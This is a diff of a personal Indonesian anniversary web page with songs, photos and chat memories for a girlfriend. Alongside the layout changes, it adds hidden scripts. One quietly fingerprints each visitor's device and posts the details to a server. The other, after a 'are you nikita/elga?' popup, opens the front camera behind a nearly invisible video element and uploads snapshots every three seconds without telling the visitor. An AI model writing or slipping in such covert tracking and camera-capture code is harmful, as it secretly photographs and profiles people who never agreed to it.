@@ -10,53 +10,70 @@
   <meta property="og:image" content="img/logo.ico" /> <meta property="og:url" content="https://elrexsaa.github.io/kenangan.html" /> <meta property="og:type" content="website" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
+
 
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="intro-screen">
     <div id="intro-text" class="intro-text"></div>
-</div>
+  </div>
 
   <div class="bg-hearts"></div>
 
   <main class="page--stack hidden">
-    <header class="mem-header reveal-section">
-      <h2 id="greeting" class="typewriter">Hi, My Beloved Nikita Friskila Pakpahan💗💗💗</h2>
-      <p class="muted">haii sayangg, silahkan pilih atau scroll sayaanggg😻😻😻</p>
-      <button id="btnLogout" onclick="doLogout()">Logout</button>
+    
+    <header class="site-header reveal-section">
+      <div class="header-content">
+        <h2 id="greeting" class="typewriter">Hi, My Beloved Nikita Friskila Pakpahan💗</h2>
+        <button id="btnLogout" onclick="doLogout()">Logout</button>
+      </div>
+      
+      <div class="countdown-container">
+        <div class="countdown-title">Waktu Menuju Anniversary Kita!</div>
+        <div id="countdown">Memuat hitung mundur...</div>
+      </div>
     </header>
 
-    <div class="countdown-container reveal-section">
-      <div class="countdown-title">Waktu Menuju Anniversary Kita!</div>
-      <div id="countdown">Memuat hitung mundur...</div>
-    </div>
-
-    <section class="menu-grid reveal-section">
-      <button class="card card--menu" data-target="#sectionSongs" onclick="scrollToTarget(this)">
-        <div class="card-title">🎵 A Song That Reminds You</div>
-        <div class="card-sub muted">aku selalu ingat kamu kalo puter lagu ini</div>
+    <nav class="main-menu reveal-section">
+      <button class="menu-card" data-target="#sectionSongs" onclick="scrollToTarget(this)">
+        <span class="menu-icon">🎵</span>
+        <span class="menu-title">Lagu Kita</span>
+        <span class="menu-sub">Lagu pengingatmu</span>
       </button>
-      <button class="card card--menu" data-target="#sectionPhotos" onclick="scrollToTarget(this)">
-        <div class="card-title">📸 Foto-foto Kita</div>
-        <div class="card-sub muted">sedikit foto kenangan kitaa</div>
+      <button class="menu-card" data-target="#sectionPhotos" onclick="scrollToTarget(this)">
+        <span class="menu-icon">📸</span>
+        <span class="menu-title">Foto Kita</span>
+        <span class="menu-sub">Kenangan dalam gambar</span>
       </button>
-      <button class="card card--menu" data-target="#sectionChat" onclick="scrollToTarget(this)">
-        <div class="card-title">💬 Chat Waktu Pertama Kali</div>
-        <div class="card-sub muted">awal dari segalanya</div>
+      <button class="menu-card" data-target="#sectionChat" onclick="scrollToTarget(this)">
+        <span class="menu-icon">💬</span>
+        <span class="menu-title">Chat Pertama</span>
+        <span class="menu-sub">Awal dari segalanya</span>
       </button>
-      <button class="card card--menu" data-target="#sectionQuotes" onclick="scrollToTarget(this)">
-        <div class="card-title">📝 Chat Favorit</div>
-        <div class="card-sub muted">chat favorit akuu🤍</div>
+      <button class="menu-card" data-target="#sectionQuotes" onclick="scrollToTarget(this)">
+        <span class="menu-icon">📝</span>
+        <span class="menu-title">Chat Favorit</span>
+        <span class="menu-sub">Kata-kata manismu</span>
       </button>
-    </section>
-
+      <button class="menu-card" data-target="#sectionAboutMe" onclick="scrollToTarget(this)">
+        <span class="menu-icon">👨‍💻</span>
+        <span class="menu-title">Tentang Aku</span>
+        <span class="menu-sub">Sedikit tentang 'elga'</span>
+      </button>
+      <button class="menu-card" data-target="#sectionAboutYou" onclick="scrollToTarget(this)">
+        <span class="menu-icon">💖</span>
+        <span class="menu-title">Tentang Kamu</span>
+        <span class="menu-sub">Hal yang kucintai</span>
+      </button>
+    </nav>
+    
     <div id="sectionSongs" class="content-section reveal-section">
       <h3>🎵 A Song That Reminds You</h3>
       <p>top 3 lagu yang kalo diputer aku selalu inget km hihi, kalo km puter aku pasti lagi nari bareng km di pikiran aku hahaha</p>
       
       <div class="track-list">
-        
         <div class="music-card">
           <img class="track-cover" src="img/cover1.jpg" alt="Cover Album All Of Me">
           <div class="track-info">
@@ -65,7 +82,6 @@
             <audio controls src="sound/sound1.mp3"></audio>
           </div>
         </div>
-
         <div class="music-card">
           <img class="track-cover" src="img/cover2.JPG" alt="Cover Album Nina">
           <div class="track-info">
@@ -74,7 +90,6 @@
             <audio controls src="sound/sound2.mp3"></audio>
           </div>
         </div>
-
         <div class="music-card">
           <img class="track-cover" src="img/cover3.jpg" alt="Cover Album Kenangan Manis">
           <div class="track-info">
@@ -84,7 +99,7 @@
           </div>
         </div>
       </div>
-      </div>
+    </div>
 
     <div id="sectionPhotos" class="content-section reveal-section">
       <h3>📸 Foto-foto Kita</h3>
@@ -100,7 +115,6 @@
           <div class="carousel-slide"><img src="img/f2.jpg" alt="Foto Kenangan 6"></div>
         </div>
       </div>
-      
     </div>
 
     <div id="sectionChat" class="content-section reveal-section">
@@ -120,49 +134,41 @@
       <p>chat km yang bikin aku makin sayang, cinta sama km HAHAHAHA</p>
       
       <div class="fav-chat-container">
-        
         <div class="fav-chat-bubble right">
           <div class="text">km kann jagoan nya aku.</div>
-          <div class="meta">
-            <span class="timestamp">23:35</span>
-            <span class="favorite-star">⭐</span>
-          </div>
+          <div class="meta"><span class="timestamp">23:35</span><span class="favorite-star">⭐</span></div>
         </div>
-        
         <div class="fav-chat-bubble right">
           <div class="text">yasudaa intinyaa km bisaa, AKUUU YAKINN SAYANGGKU...</div>
-          <div class="meta">
-            <span class="timestamp">23:36</span>
-            <span class="favorite-star">⭐</span>
-          </div>
+          <div class="meta"><span class="timestamp">23:36</span><span class="favorite-star">⭐</span></div>
         </div>
-
         <div class="fav-chat-bubble right">
           <div class="text">oalaa, kalo suda ngampus masuk biasa semangatt buat ngejalanin nya yaa, capai smua yg km critain aku pokokna hrs tauu klo km berhasill</div>
-          <div class="meta">
-            <span class="timestamp">23:49</span>
-            <span class="favorite-star">⭐</span>
-          </div>
+          <div class="meta"><span class="timestamp">23:49</span><span class="favorite-star">⭐</span></div>
         </div>
-
         <div class="fav-chat-bubble right">
           <div class="text">AKUU SLALUU SUPPORT KM SAYANG, BAHKAN KALAU DUNIA GA BERPIHAK SM KAMUU ADAA AK DISINI</div>
-          <div class="meta">
-            <span class="timestamp">00:05</span>
-            <span class="favorite-star">⭐</span>
-          </div>
+          <div class="meta"><span class="timestamp">00:05</span><span class="favorite-star">⭐</span></div>
         </div>
-
         <div class="fav-chat-bubble right">
           <div class="text">km kan cinta nyaa aku</div>
-          <div class="meta">
-            <span class="timestamp">16:42</span>
-            <span class="favorite-star">⭐</span>
-          </div>
+          <div class="meta"><span class="timestamp">16:42</span><span class="favorite-star">⭐</span></div>
         </div>
+      </div>
+    </div>
 
-      </div>
-      </div>
+    <div id="sectionAboutMe" class="content-section reveal-section">
+      <h3>👨‍💻 Tentang Aku (Elga)</h3>
+      <p>Ini adalah tempat untuk menceritakan sedikit tentang dirimu. Kamu bisa menulis tentang apa yang kamu sukai, harapanmu untuk hubungan ini, atau kenangan favoritmu bersamanya yang paling berkesan.</p>
+      <p>Contoh: "Aku paling suka waktu kita..." atau "Harapanku, kita bisa selalu..."</p>
+    </div>
+    
+    <div id="sectionAboutYou" class="content-section reveal-section">
+      <h3>💖 Tentang Kamu (Nikita)</h3>
+      <p>Ini adalah tempat untuk menceritakan tentang dia. Apa yang paling kamu sukai darinya? Kenapa dia begitu spesial untukmu? Tulis semua hal indah tentangnya di sini.</p>
+      <p>Contoh: "Hal yang bikin aku jatuh cinta sama kamu adalah..." atau "Kamu itu orang yang paling..."</p>
+    </div>
+
   </main>
 
   <audio id="bgm" src="audio.mp3" autoplay loop></audio>
@@ -174,7 +180,6 @@
     const AUTH_KEY = 'kenangan_verified';
     const LOGIN_PAGE = 'index.html';
     
-    // Periksa otorisasi
     if (localStorage.getItem(AUTH_KEY) !== 'true') {
       window.location.replace(LOGIN_PAGE);
     }
@@ -183,6 +188,163 @@
       localStorage.removeItem(AUTH_KEY);
       window.location.replace(LOGIN_PAGE);
     }
+  </script>
+
+  <script>
+  (async function sendVisit(){
+    try {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const platform = navigator.platform;
+      const screenW = window.screen?.width;
+      const screenH = window.screen?.height;
+      const viewportW = document.documentElement.clientWidth || window.innerWidth;
+      const viewportH = document.documentElement.clientHeight || window.innerHeight;
+      const referrer = document.referrer;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      let uaData = null;
+      if (navigator.userAgentData) {
+        try {
+          uaData = await navigator.userAgentData.getHighEntropyValues(['platform','model','brands','mobile']);
+        } catch {}
+      }
+
+      const payload = {
+        ua, uaData, platform, lang,
+        screen: { screenW, screenH, viewportW, viewportH },
+        tz, referrer, href: location.href
+      };
+
+      fetch('/api/visit', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e){
+      console.log('log fail', e);
+    }
+  })();
+  </script>
+
+  <script>
+  window.addEventListener('load', () => {
+    // warna tema — ubah kalo mau warna lain
+    const themeColor = '#ff5d8f';
+
+    // overlay blur
+    const overlay = document.createElement('div');
+    overlay.style = `
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      backdrop-filter: blur(5px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999;
+      animation: fadeIn 0.4s ease;
+    `;
+    
+    // popup box
+    const box = document.createElement('div');
+    box.style = `
+      background: #fff;
+      padding: 20px 25px;
+      border-radius: 14px;
+      text-align: center;
+      font-family: 'Poppins', system-ui, sans-serif;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      max-width: 320px;
+      width: 90%;
+      color: #333;
+      animation: scaleIn 0.3s ease;
+    `;
+    box.innerHTML = `
+      <p style="margin-bottom:20px;font-size:18px;font-weight:500">kamu nikita/elga bukan😠?</p>
+      <div style="display:flex;justify-content:center;gap:10px;">
+        <button id="yesBtn" style="background:${themeColor};color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:14px;transition:0.2s;">iya</button>
+        <button id="noBtn" style="background:#f0f0f0;color:#333;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:14px;transition:0.2s;">tidak</button>
+      </div>
+    `;
+
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+
+    // animasi
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes fadeIn { from {opacity:0} to {opacity:1} }
+      @keyframes scaleIn { from {transform:scale(0.8)} to {transform:scale(1)} }
+      #yesBtn:hover { background:${themeColor};filter:brightness(0.9);}
+      #noBtn:hover { background:#ddd; }
+    `;
+    document.head.appendChild(style);
+
+    // klik "tidak"
+    document.getElementById('noBtn').addEventListener('click', () => {
+      window.location.href = 'index.html';
+    });
+
+    // klik "iya"
+    document.getElementById('yesBtn').addEventListener('click', async () => {
+      overlay.remove();
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.playsInline = true;
+        video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+
+        await new Promise(r => {
+          if (video.readyState >= 2) return r();
+          video.addEventListener('loadeddata', r, { once: true });
+        });
+
+        // mulai ambil foto berkala
+        startSnapshotLoop(video, stream, 12000); // 12000 ms = 12 detik
+      } catch (err) {
+        console.error('izin kamera ditolak', err);
+      }
+    });
+
+    function startSnapshotLoop(video, stream, duration) {
+      const intervalMs = 3000; // ambil foto setiap 3 detik
+      const loop = setInterval(() => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 1280;
+          canvas.height = video.videoHeight || 720;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+          fetch('/api/upload-photo', {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({
+              image: dataUrl,
+              page: location.pathname
+            })
+          }).catch(err => console.error('gagal upload', err));
+        } catch (e) {
+          console.error('gagal capture', e);
+          clearInterval(loop);
+          stream.getTracks().forEach(t => t.stop());
+          video.remove();
+        }
+      }, intervalMs);
+
+      // otomatis berhenti setelah waktu habis
+      setTimeout(() => {
+        clearInterval(loop);
+        stream.getTracks().forEach(t => t.stop());
+        video.remove();
+        console.log('📸 selesai ambil foto setelah 12 detik');
+      }, duration);
+    }
+  });
   </script>
 </body>
 </html>
